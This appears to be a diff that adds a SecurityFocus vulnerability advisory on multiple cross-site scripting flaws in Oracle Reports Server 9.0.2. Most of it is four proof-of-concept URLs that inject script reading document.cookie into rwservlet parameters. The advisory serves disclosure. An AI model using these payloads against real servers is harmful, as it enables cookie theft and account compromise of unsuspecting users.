@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/14313/info
+
+Multiple remote cross-site scripting vulnerabilities affect Oracle Reports Server.
+
+An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.
+
+Oracle Reports Server 9.0.2 with patchset 2 is reported to be vulnerable. Other versions may be affected as well. 
+
+http://www.example.com:7778/reports/rwservlet/showenv?server=reptest&debug=<script>aler
+t(document.cookie);</script>
+
+http://www.example.com:7778/reports/rwservlet/parsequery?server=myserver&test=<script>a
+lert(document.cookie);</script>
+
+http://www.example.com:7778/reports/rwservlet?server=myserver+report=test.rdf+userid=sc
+ott/tiger@iasdb+destype=localFile+desformat=delimited+desname=FILE:+CELLWRAPPER=
+*+delimiter=<script>alert(document.cookie);</script>
+
+http://www.example.com:7778/reports/rwservlet?server=myserver+report=test.rdf+userid=sc
+ott/tiger@iasdb+destype=localFile+desformat=delimited+desname=FILE:+CELLWRAPPER=
+<script>alert(document.cookie);</script> 
